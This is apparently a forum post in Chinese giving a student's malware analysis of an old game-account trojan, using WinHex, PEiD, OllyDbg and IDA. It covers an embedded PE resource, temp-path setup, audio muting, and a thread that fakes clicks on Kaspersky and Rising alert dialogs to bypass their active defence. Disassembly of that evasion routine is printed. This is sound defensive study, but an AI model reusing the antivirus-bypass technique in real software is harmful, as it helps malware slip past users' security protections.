
# [原创]一款老木马的分析

【文章标题】:一款老木马的分析

【文章作者】: loongzyd

【作者声明】: 学长布置的"作业","打怪升级长经验"![](https://bbs.kanxue.com/view/img/face/1.gif)

【特别注意】:分析完了之后在网上看了一下大概是07年的一款网游木马,比较"悲剧"的是在论坛上3年前就有前辈发表过分析文章。本来就不该发了,但是发现两个程序有点差别。学长给我的相对简单一点，适合我这种菜鸟分析。所以就当今天的学习笔记吧。

【是否加壳】:无

【使用工具】:`OllyDbg`,`IDA`,`PEID`

昨天胖胖回学校闲来无事,在我电脑上玩了一会儿,走之前留下一个程序让我分析,分析完毕之后:`jmp`  【特别注意】![](https://bbs.kanxue.com/view/img/face/16.gif)

下面进入正题:

首先,我们用`winhex`打开`upxdnd.exe`，发现应该是没有加壳的。在往后拖动的的过程中我们在`offset:1860`处发现了'MZ',1930处发现了'PE',基本可以确定是个PE格式的文件。我们再用`peid`载入，发现`.rsrc`的文件偏移地址为0x1800,0x1860的数据属于资源节,看来是把一个PE文件作为资源数据了.下面我们来验证一下:(顺便巩固一下资源目录表的知识)

![](https://bbs.kanxue.com/upload/attach/201107/372322_h1uc203br7y1xx4.jpg)

```
IMAGE_RESOURCE_DIRECTORY STRUCT
Characteristics                DWORD  ?  ;理论为属性标志,但通常为0
TimeDateStamp                DWORD  ?  ;资源建立时间,通常为0
MajorVersion                DWORD  ?  ;主版本号,通常为0
MinorVersion                DWORD  ?  ;副版本号,通常为0
NumberOfNamedEntries        WORD   ?  ;使用名字的资源个数
NumberOfIdEntries        WORD   ?  ;使用ID数字的资源个数
IMAGE_RESOURCE_DIRECTORY ENDS
```

从截图可以看出,`NumberOfNamedEntires`为1,`NumberOfIdEntries`为0.所以本目录中的目录项总数为1.从`offset:1810`开始有一个`IMAGE_RESOURCE_DIRECTORY_ENTRY`结构,其中`Name`字段为80000058h,`OffsetToData`字段为80000018h,`Name`字段高位为1,所以低位数据作为地址加上资源节起始地址为00001858,指向`IMAGE_RESOURCE_DIR_STRING_U`结构,`Length`字段为03h,表示资源名称长度为3,而资源名称字符串采用UNICODE编码，所以字符串为"DLL",并且第一层数据目录中`Name`字段表示资源类型,所以该资源类型为"DLL".而`OffsetToData`字段的高位为1,低位数据为0018h,此时加上资源节的开始00001800h为00001818h:,同理我们可以看到第二层有1个使用ID数字的资源,对应的`IMAGE_RESOURCE_DIRECTORY_ENTRY`结构中,`Name`字段为65h,所以该资源的名称为65h.`OffsetToData`字段为80000030h,得到下一层的地址为00001830h:这一层同样只有一个使用ID数字的资源,对应的`IMAGE_RESORCE_DIRECTORY_ENTRY`地址为00001840h,因为这是第三层了,其`OffsetToData`指向`IMAGE_RESOURCE_DATA_ENTRY`结构,我们找到了资源数据的RVA为:4060,转化为相应的Offset为00001860,刚好为PE格式文件数据的首地址。我们可以猜测程序将通过加载资源的方式将此PE文件释放出来.该资源的类型为"DLL",名称为65h.![](https://bbs.kanxue.com/view/img/face/1.gif)

接下来我们同时用`OllDbg`和`IDA`载入(双管齐下):

定位到`WinMain`函数004012F2h.

我们发现程序首先获取Temp文件路径(`GetTempPath`),然后获取当前程序的路径(`GetModuleFileName`).

然后将当前程序完整路径中的最后一个`\`给清除。然后调用一个子程序`upxdnd.004010F7`:这个子函数的作用应该是将系统的音量在程序运行时关闭.

```
mov     edi, 103h
push    eax             ; lpBuffer
push    edi             ; nBufferLength
call    ds:GetTempPathA                   ;获取临时目录
mov     esi, ds:strrchr
lea     eax, [ebp+Source]
push    5Ch             ; Ch
push    eax             ; Str
call    esi ; strrchr
xor     ebx, ebx
_text_401337:
lea     eax, [ebp+Source]
push    eax             ; Source
lea     eax, [ebp+CmdLine]
push    eax             ; Dest
call    strcpy
pop     ecx
lea     eax, [ebp+FileName]
pop     ecx
push    edi             ; nSize
push    eax             ; lpFilename
push    ebx             ; hModule
call    ds:GetModuleFileNameA     ;hModule为NULL，获取当前程序完整路径。
lea     eax, [ebp+FileName]
push    5Ch             ; Ch
push    eax             ; Str
call    esi ; strrchr
```

后创建了一个线程，线程函数`upxdnd.0040104c`.

这个函数的功能是查找窗口标题为`AVP.AlertDialoG`的窗口,然后再这个窗口上查找标题为"允许","跳过"的子窗体,分别向这两个窗体发送`WM_LBUTTONDOWN`(201h),`WM_LBUTTONUP`(202h)消息,模拟鼠标点击,接着查找窗口标题为`AVP.Product_Notification`,"瑞星注册表监控提示"的窗口,分别向这两个窗体发送`WM_CLOSE`(10h)消息,模拟用户关闭.

```
0040104C   .  53            PUSH EBX
0040104D   .  55            PUSH EBP
0040104E   .  56            PUSH ESI
0040104F   .  8B35 04214000 MOV ESI,DWORD PTR DS:[<&USER32.SendMessa>;  USER32.SendMessageA
00401055   .  57            PUSH EDI
00401056   .  33FF          XOR EDI,EDI
00401058   >  6A 01         PUSH 1                                   ; /Timeout = 1. ms
0040105A   .  FF15 80204000 CALL DWORD PTR DS:[<&KERNEL32.Sleep>]    ; \Sleep
00401060   .  57            PUSH EDI                                 ; /Title
00401061   .  68 4C314000   PUSH upxdnd.0040314C                     ; |Class = "AVP.AlertDialoG"
00401066   .  FF15 00214000 CALL DWORD PTR DS:[<&USER32.FindWindowA>>; \FindWindowA
0040106C   .  8BE8          MOV EBP,EAX
0040106E   .  3BEF          CMP EBP,EDI
00401070   .  74 50         JE SHORT upxdnd.004010C2
00401072   .  68 5C314000   PUSH upxdnd.0040315C                     ; /Title = "允许"
00401077   .  57            PUSH EDI                                 ; |Class
00401078   .  57            PUSH EDI                                 ; |hAfterWnd
00401079   .  55            PUSH EBP                                 ; |hParent
0040107A   .  FF15 FC204000 CALL DWORD PTR DS:[<&USER32.FindWindowEx>; \FindWindowExA
00401080   .  8BD8          MOV EBX,EAX
00401082   .  3BDF          CMP EBX,EDI
00401084   .  74 14         JE SHORT upxdnd.0040109A
00401086   .  57            PUSH EDI
00401087   .  57            PUSH EDI
00401088   .  68 01020000   PUSH 201            ;WM_LBUTTONDOWN(201h)
0040108D   .  53            PUSH EBX
0040108E   .  FFD6          CALL ESI
00401090   .  57            PUSH EDI
00401091   .  57            PUSH EDI
00401092   .  68 02020000   PUSH 202           ;WM_LBUTTONUP(202h)
00401097   .  53            PUSH EBX
00401098   .  FFD6          CALL ESI
0040109A   >  68 08314000   PUSH upxdnd.00403108                     ; /Title = "跳过"
0040109F   .  57            PUSH EDI                                 ; |Class
004010A0   .  57            PUSH EDI                                 ; |hAfterWnd
004010A1   .  55            PUSH EBP                                 ; |hParent
004010A2   .  FF15 FC204000 CALL DWORD PTR DS:[<&USER32.FindWindowEx>; \FindWindowExA
004010A8   .  8BD8          MOV EBX,EAX
004010AA   .  3BDF          CMP EBX,EDI
004010AC   .  74 14         JE SHORT upxdnd.004010C2
004010AE   .  57            PUSH EDI
004010AF   .  57            PUSH EDI
004010B0   .  68 01020000   PUSH 201
004010B5   .  53            PUSH EBX
004010B6   .  FFD6          CALL ESI
004010B8   .  57            PUSH EDI
004010B9   .  57            PUSH EDI
004010BA   .  68 02020000   PUSH 202
004010BF   .  53            PUSH EBX
004010C0   .  FFD6          CALL ESI
004010C2   >  8B1D 00214000 MOV EBX,DWORD PTR DS:[<&USER32.FindWindo>;  USER32.FindWindowA
004010C8   .  57            PUSH EDI                                 ; /Title
004010C9   .  68 30314000   PUSH upxdnd.00403130                     ; |Class = "AVP.Product_Notification"
004010CE   .  FFD3          CALL EBX                                 ; \FindWindowA
004010D0   .  3BC7          CMP EAX,EDI
004010D2   .  74 07         JE SHORT upxdnd.004010DB
004010D4   .  57            PUSH EDI
004010D5   .  57            PUSH EDI
004010D6   .  6A 10         PUSH 10                                        ;WM_CLOSE(10h）
004010D8   .  50            PUSH EAX
004010D9   .  FFD6          CALL ESI
004010DB   >  68 10314000   PUSH upxdnd.00403110
004010E0   .  57            PUSH EDI
004010E1   .  FFD3          CALL EBX
004010E3   .  3BC7          CMP EAX,EDI
004010E5   .^ 0F84 6DFFFFFF JE upxdnd.00401058
004010EB   .  57            PUSH EDI
004010EC   .  57            PUSH EDI
004010ED   .  6A 10         PUSH 10
004010EF   .  50            PUSH EAX
004010F0   .  FFD6          CALL ESI
004010F2   .^ E9 61FFFFFF   JMP upxdnd.00401058
```

通过模拟用户点击的方法"过"掉了卡巴和瑞星的主动防御![](https://bbs.kanxue.com/view/img/face/16.gif)

关闭系统音量绝对算是"以人为本"![](https://bbs.kanxue.com/view/img/face/50.gif)

```
_text_4010F7 proc near
var_174= dword ptr -174h
var_170= dword ptr -170h
Dst= dword ptr -0E0h
var_D4= dword ptr -0D4h
var_C8= dword ptr -0C8h
pmxcd= tMIXERCONTROLDETAILS ptr -38h
pmxlc= tagMIXERLINECONTROLSA ptr -20h
var_8= dword ptr -8
hmxobj= dword ptr -4
arg_0= dword ptr  8
push    ebp
mov     ebp, esp
sub     esp, 174h
push    ebx
push    esi
push    edi
xor     edi, edi
push    edi             ; fdwOpen
push    edi             ; dwInstance
push    edi             ; dwCallback
lea     eax, [ebp+hmxobj]
push    edi             ; uMxId
push    eax             ; phmx
call    ds:mixerOpen
mov     esi, 0A8h
lea     eax, [ebp+Dst]
push    esi             ; Size
push    edi             ; Val
push    eax             ; Dst
call    memset
add     esp, 0Ch
lea     eax, [ebp+Dst]
```
